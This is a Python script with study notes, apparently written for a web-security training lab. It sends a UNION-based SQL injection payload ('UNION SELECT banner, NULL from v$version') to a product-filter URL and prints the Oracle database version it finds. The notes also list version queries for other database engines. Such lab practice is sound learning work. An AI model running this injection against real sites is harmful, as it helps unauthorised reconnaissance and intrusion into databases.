"""
script is for lab of sqli attack to grab the database type and version for oracle databases

Examine the db in sqli attacks 

info of db 

-> type and version of the database 
-> tables and columns in the database


To query db type and version 

we need to inject provider-specific queries to see if one works 

The following are some queries to determine the database version for some popular database types:
Database type 	        Query

Microsoft, MySQL 	    SELECT @@version
Oracle 	                SELECT * FROM v$version , SELECT banner FROM v$version
PostgreSQL 	            SELECT version() 


payload for banner type and version in oracle
' UNION SELECT banner, NULL from v$version--


"""

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit_sqli_version(url):
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res,'html.parser')
        version = soup.find(text=re.compile('.*Oracle\sDatabase.*'))
        print("[+] The Oracle database version is: " + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")
